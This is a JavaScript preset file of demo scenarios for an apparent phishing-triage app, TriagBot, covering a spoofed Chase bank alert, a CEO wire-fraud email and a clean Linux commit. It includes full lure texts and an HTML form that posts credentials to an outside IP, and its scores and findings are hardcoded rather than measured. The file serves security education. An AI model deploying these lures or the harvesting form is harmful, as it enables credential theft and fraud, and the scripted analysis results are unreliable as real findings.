// data/presets.js
// Realistic cyber threat scenarios and safe benchmarks for TriagBot

export const DEMO_PRESETS = {
  bankLogin: {
    id: "bank-login-preset",
    name: "Spoofed Bank Login",
    badge: "Phishing Threat",
    icon: "shield-alert",
    sampleInput: `URGENT SECURITY ALERT: We detected unauthorized login attempts to your Chase Online Banking account from IP 185.220.101.5 (Moscow, RU).

Your account has been temporarily restricted to prevent fraudulent transfers. You must verify your identity within 2 hours or your access will be permanently suspended.

Verify your account immediately: https://chase-security-verify.net/auth/login?session=93849102849

Department of Fraud Prevention & Risk Mitigation
JPMorgan Chase & Co.`,
    analysis: {
      risk: "dangerous",
      riskScore: 92,
      technicalScore: 88,
      psychologicalScore: 96,
      threatType: "Credential Phishing (Brand Impersonation)",
      confidence: 97,
      explanation: "This message mimics an authentic Chase Bank security alert. It leverages extreme artificial urgency ('2-hour deadline') and fear of financial loss to coerce you into entering banking credentials on a newly registered lookalike domain.",
      recommendedAction: {
        label: "DO NOT CLICK OR SUBMIT CREDENTIALS",
        level: "danger",
        description: "Do not click the link or provide any information. Open your banking mobile app directly or navigate manually to the official bank URL."
      },
      technicalSignals: [
        {
          id: "tech-1",
          name: "Domain Impersonation & Typosquatting",
          status: "danger",
          score: 94,
          detail: "Target domain 'chase-security-verify.net' was registered 48 hours ago via anonymized registrar. It is NOT affiliated with JPMorgan Chase (chase.com).",
          tag: "Domain Spoof"
        },
        {
          id: "tech-2",
          name: "Credential Harvesting Form Handler",
          status: "danger",
          score: 91,
          detail: "Isolated sandbox detected an unencrypted POST action routing username/password inputs to an unverified off-shore IP (194.26.29.112).",
          tag: "Exfiltration"
        },
        {
          id: "tech-3",
          name: "SSL & Identity Mismatch",
          status: "warning",
          score: 79,
          detail: "Domain uses automated free domain-validation SSL with no Organization Validation (OV/EV) certificate backing legitimate financial institutions.",
          tag: "Cert Anomaly"
        },
        {
          id: "tech-4",
          name: "Obfuscated Query Tracking",
          status: "danger",
          score: 88,
          detail: "Session token parameter is base64-encoded to track email recipient click-through rates.",
          tag: "Telemetry Tracking"
        }
      ],
      psychologicalSignals: [
        {
          id: "psych-1",
          name: "Artificial Countdown Urgency",
          status: "danger",
          score: 98,
          detail: "Imposes a strict '2 hours' countdown designed to induce cognitive rush and suppress critical verification.",
          tag: "Urgency Vector"
        },
        {
          id: "psych-2",
          name: "Fear & Financial Loss Aversion",
          status: "danger",
          score: 95,
          detail: "Threatens 'permanent account suspension' and 'fraudulent transfers' to trigger panic-driven compliance.",
          tag: "Fear Appeal"
        },
        {
          id: "psych-3",
          name: "Authority & Institutional Spoofing",
          status: "danger",
          score: 94,
          detail: "Employs corporate jargon ('Department of Fraud Prevention & Risk Mitigation') to create illusory institutional authority.",
          tag: "Authority Bias"
        },
        {
          id: "psych-4",
          name: "Coercive Friction Reduction",
          status: "warning",
          score: 87,
          detail: "Presents a direct one-click link as the 'only immediate remedy' to bypass out-of-band verification.",
          tag: "Bypass Lure"
        }
      ],
      preview: {
        url: "https://chase-security-verify.net/auth/login?session=93849102849",
        pageTitle: "Chase Online - Account Verification & Unlock",
        domainAge: "2 Days Old",
        sslIssuer: "Free DV Authority",
        ipLocation: "Frankfurt, DE (Proxy)",
        screenshotType: "bank_phish",
        highlightedElements: [
          { label: "Spoofed Chase Logo & Header", type: "impersonation", top: "18%", left: "35%" },
          { label: "Malicious Credential Capture Form", type: "threat", top: "45%", left: "30%" },
          { label: "Deceptive '2h Countdown' Warning Banner", type: "urgency", top: "32%", left: "20%" }
        ],
        rawDomSnippet: `<!-- Sandboxed Zero-Execution DOM Snapshot -->
<div class="phish-container bg-navy">
  <img src="/fake-assets/chase-logo.svg" alt="Chase Official" />
  <div class="alert-banner">ACCOUNT SUSPENDED - 01:59:42 REMAINING</div>
  <form action="http://194.26.29.112:8080/collect.php" method="POST">
    <input type="text" name="usr_id" placeholder="Username / Access ID" />
    <input type="password" name="pwd_id" placeholder="Password" />
    <button type="submit">Verify & Restore Account</button>
  </form>
</div>`
      },
      smartSafeReply: {
        category: "Corporate De-escalation & Verification",
        text: "Thank you for the notification. In accordance with standard security protocol, I will not access my account via provided external links. I am verifying my account status directly via the official Chase mobile banking app and verified customer service hotline."
      },
      microLesson: {
        title: "The Lookalike Domain & Countdown Trap",
        summary: "Legitimate financial institutions NEVER enforce a 2-hour countdown via email or direct you to domains containing hyphenated add-ons like 'chase-security-verify.net'. Always open your browser and manually navigate to the known, trusted domain."
      }
    }
  },

  ceoScam: {
    id: "ceo-scam-preset",
    name: "Urgent CEO Scam",
    badge: "Social Engineering",
    icon: "alert-triangle",
    sampleInput: `From: David Sterling <david.sterling.exec-office@gmail.com>
To: finance-team@company.internal
Subject: URGENT & CONFIDENTIAL: Acquisition deposit needed before 3:00 PM

Hey team,

I'm currently locked in an off-site board meeting with prospective investors and cannot take phone calls right now. 

We are finalizing a confidential strategic acquisition and need an immediate escrow deposit of $48,500 wired to our intermediary counsel before 3:00 PM today to secure exclusivity.

Please execute this wire immediately using the attached routing instructions. Treat this with utmost discretion — do not discuss this on Slack or public channels as this is strictly NDA-bound.

Send me the wire confirmation receipt as soon as it's processed.

Best,
David Sterling
Chief Executive Officer`,
    analysis: {
      risk: "dangerous",
      riskScore: 89,
      technicalScore: 74,
      psychologicalScore: 98,
      threatType: "Business Email Compromise (BEC / CEO Fraud)",
      confidence: 95,
      explanation: "Classic Business Email Compromise (BEC). The attacker impersonates the CEO using a lookalike personal Gmail address, claims an inability to take phone calls, and creates high-stakes confidential urgency to bypass standard dual-authorization wire transfer procedures.",
      recommendedAction: {
        label: "HOLD WIRE & VERIFY OUT-OF-BAND",
        level: "danger",
        description: "Do not execute the wire transfer. Contact the executive via known internal voice channel or in-person verification before taking any financial action."
      },
      technicalSignals: [
        {
          id: "tech-1",
          name: "Display Name Spoofing & Free Mail Provider",
          status: "danger",
          score: 95,
          detail: "Sender uses CEO display name 'David Sterling' with public address '@gmail.com' rather than the verified enterprise domain '@company.internal'.",
          tag: "Header Mismatch"
        },
        {
          id: "tech-2",
          name: "Missing SPF / DKIM Enterprise Signature",
          status: "danger",
          score: 82,
          detail: "Email fails corporate SPF/DMARC alignment check for internal executive communications.",
          tag: "Auth Failure"
        },
        {
          id: "tech-3",
          name: "Wire Route Risk Indicators",
          status: "warning",
          score: 78,
          detail: "Routing instructions correspond to a high-turnover fintech intermediary account frequently linked to rapid fund dispersion.",
          tag: "Mule Account"
        }
      ],
      psychologicalSignals: [
        {
          id: "psych-1",
          name: "Extreme Executive Authority Pressure",
          status: "danger",
          score: 99,
          detail: "Impersonates highest internal authority (CEO) to pressure subordinates into immediate compliance.",
          tag: "Authority Weaponization"
        },
        {
          id: "psych-2",
          name: "Channel Isolation (Communication Severing)",
          status: "danger",
          score: 97,
          detail: "Explicitly prohibits phone calls ('locked in meeting') and team discussion ('strictly confidential NDA') to prevent dual-verification.",
          tag: "Isolation Tactic"
        },
        {
          id: "psych-3",
          name: "Time-Sensitive Acquisition Pressure",
          status: "danger",
          score: 95,
          detail: "Sets an artificial deadline ('before 3:00 PM today to secure exclusivity') to induce stress and rushed execution.",
          tag: "Deadline Pressure"
        },
        {
          id: "psych-4",
          name: "Compliance Flattery & Trust Exploitation",
          status: "warning",
          score: 86,
          detail: "Frames obedience as loyalty to a high-value confidential company milestone.",
          tag: "Social Norm Manipulation"
        }
      ],
      preview: {
        url: "email://inbox/msg-8492019-confidential",
        pageTitle: "Executive Mail Gateway - Message Inspection",
        domainAge: "Gmail (Free Webmail)",
        sslIssuer: "Google TLS (External Origin)",
        ipLocation: "Lagos, NG (Originating IP)",
        screenshotType: "bec_email",
        highlightedElements: [
          { label: "Spoofed Executive Display Name (External @gmail.com)", type: "threat", top: "16%", left: "24%" },
          { label: "Mandated Isolation ('Do not call or discuss on Slack')", type: "urgency", top: "42%", left: "20%" },
          { label: "High-Value Unauthorized Wire Demand ($48,500)", type: "threat", top: "58%", left: "20%" }
        ],
        rawDomSnippet: `<!-- Sandboxed Zero-Execution Email Payload -->
<div class="mail-headers">
  <span class="header-from">From: "David Sterling" &lt;david.sterling.exec-office@gmail.com&gt;</span>
  <span class="header-auth status-fail">DMARC: FAIL (Domain Mismatch)</span>
  <span class="header-route">Origin: 102.89.44.12 (External Public ASN)</span>
</div>
<div class="mail-body">
  <p>I'm currently locked in an off-site meeting... Need $48,500 wired before 3:00 PM...</p>
</div>`
      },
      smartSafeReply: {
        category: "Corporate Dual-Authorization Challenge",
        text: "Hi David. In compliance with corporate treasury policy SEC-04, all wire disbursements exceeding $10,000 require verbal voice verification and dual sign-off from the CFO. I have initiated the verification workflow and will await secondary authentication before processing."
      },
      microLesson: {
        title: "The 'Executive in a Meeting' Isolation Play",
        summary: "Attackers frequently claim they 'cannot take phone calls' to intentionally cut off your ability to verify. Whenever an executive requests financial transfers or gift cards with secrecy, ALWAYS verify verbally on a known number before taking action."
      }
    }
  },

  cleanRepo: {
    id: "clean-repo-preset",
    name: "Clean Repo (Safe)",
    badge: "Verified Clean",
    icon: "check-circle",
    sampleInput: `https://github.com/torvalds/linux/commit/8032752e636511a0179a957813a30a112ec4a87a

Linux kernel source repository commit by Linus Torvalds.
Verified commit signature with trusted GPG key.
No suspicious redirect chains, zero obfuscated payloads, clean reputation across 40+ security threat feeds.`,
    analysis: {
      risk: "safe",
      riskScore: 6,
      technicalScore: 4,
      psychologicalScore: 8,
      threatType: "Legitimate Verified Asset",
      confidence: 99,
      explanation: "No technical anomalies or social engineering tactics detected. The URL resolves to the authentic GitHub domain with valid Extended Validation certificate, authentic GPG commit signing, and clean global reputation.",
      recommendedAction: {
        label: "SAFE TO CONTINUE",
        level: "safe",
        description: "The content and destination are verified as legitimate. Standard browsing is safe."
      },
      technicalSignals: [
        {
          id: "tech-1",
          name: "Domain Reputation & Ownership",
          status: "safe",
          score: 2,
          detail: "Authentic 'github.com' owned by Microsoft Corporation. High trust domain with 15+ years established history.",
          tag: "Verified Domain"
        },
        {
          id: "tech-2",
          name: "TLS / Cryptographic Validation",
          status: "safe",
          score: 1,
          detail: "Valid TLS 1.3 certificate issued by DigiCert with full HSTS preloading enabled.",
          tag: "Strict TLS"
        },
        {
          id: "tech-3",
          name: "Cryptographic Commit Signature",
          status: "safe",
          score: 3,
          detail: "Commit signed with verified GPG fingerprint recognized in kernel developer web of trust.",
          tag: "Signed GPG"
        },
        {
          id: "tech-4",
          name: "Reputation & Blacklist Check",
          status: "safe",
          score: 0,
          detail: "Clean status across VirusTotal, Google Safe Browsing, and Cisco Talos intelligence feeds.",
          tag: "0 Detections"
        }
      ],
      psychologicalSignals: [
        {
          id: "psych-1",
          name: "No Artificial Urgency",
          status: "safe",
          score: 5,
          detail: "Text contains zero coercive time limits, deadlines, or urgency markers.",
          tag: "Objective Text"
        },
        {
          id: "psych-2",
          name: "No Fear or Loss Coercion",
          status: "safe",
          score: 4,
          detail: "No intimidation, punitive threats, or account lockout warnings detected.",
          tag: "No Threat Vectors"
        },
        {
          id: "psych-3",
          name: "Transparent Provenance",
          status: "safe",
          score: 8,
          detail: "Context matches authentic open-source development documentation without disguised intent.",
          tag: "Transparent"
        }
      ],
      preview: {
        url: "https://github.com/torvalds/linux/commit/8032752e6365",
        pageTitle: "torvalds/linux: Kernel mainline source - GitHub",
        domainAge: "16+ Years",
        sslIssuer: "DigiCert TLS RSA SHA256",
        ipLocation: "San Francisco, US (GitHub Fastly CDN)",
        screenshotType: "github_clean",
        highlightedElements: [
          { label: "Verified GPG Cryptographic Signature", type: "safe", top: "25%", left: "32%" },
          { label: "Trusted Official GitHub Infrastructure", type: "safe", top: "12%", left: "15%" },
          { label: "Open Source Code Diff (No Malicious Shellcode)", type: "safe", top: "50%", left: "20%" }
        ],
        rawDomSnippet: `<!-- Verified Safe Repository Snapshot -->
<div class="repo-header">
  <span class="badge verified">Verified GPG Signature</span>
  <span class="commit-author">Linus Torvalds &lt;torvalds@kernel.org&gt;</span>
</div>
<div class="diff-view">
  <pre>diff --git a/kernel/sched/core.c b/kernel/sched/core.c</pre>
</div>`
      },
      smartSafeReply: {
        category: "Standard Technical Communication",
        text: "This resource has been verified clean by TriagBot. You can safely inspect and proceed with standard developer workflows."
      },
      microLesson: {
        title: "Cryptographic Signatures in Software Supply Chains",
        summary: "Verified GPG signatures ensure that code commits truly originate from the stated author and have not been tampered with in transit. Checking commit verification badges is a best practice when auditing open-source dependencies."
      }
    }
  }
};
